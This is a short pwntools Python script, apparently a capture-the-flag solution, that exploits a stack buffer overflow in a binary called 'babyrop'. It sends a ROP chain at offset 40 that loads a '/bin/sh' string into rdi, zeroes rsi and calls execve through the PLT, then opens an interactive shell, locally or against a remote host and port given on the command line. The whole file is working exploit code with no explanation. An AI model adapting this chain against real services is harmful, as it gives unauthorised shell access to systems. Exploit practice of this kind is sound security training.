from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './babyrop'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()
payload = flat({
    40: [
        0x00000000004012c3, #: pop rdi ; ret
        0x40201a,           # '/bin/sh'
        0x00000000004012c1, #: pop rsi ; pop r15 ; ret
        0x0,
        0x0,
        0x00000000004011f3 # elf.plt.execve
    ]
})
# write('payload', payload)
io.sendlineafter('your name ?', payload)
io.interactive()